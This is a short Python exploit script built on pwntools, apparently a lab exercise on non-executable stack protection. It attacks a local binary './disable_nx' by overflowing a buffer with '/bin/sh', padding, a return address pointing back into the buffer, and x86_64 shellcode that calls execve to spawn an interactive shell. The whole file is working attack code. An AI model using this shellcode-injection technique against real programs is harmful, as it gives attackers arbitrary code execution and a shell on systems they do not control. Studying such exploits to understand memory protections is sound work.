from pwn import *

io = process("./disable_nx")
#io = process("./enable_nx")

print(io.recvline().decode())

buf_addr = int(input(), 16)

payload = ("/bin/sh\x00" + "a" * 16).encode()
payload += p64(buf_addr + 32)
payload += asm(f"""mov rax, 0x3b;
                   mov rdi, 0x{buf_addr:x};
                   xor rsi, rsi;
                   xor rdx, rdx;
                   syscall;""", arch="x86_64")
io.sendline(payload)

io.interactive()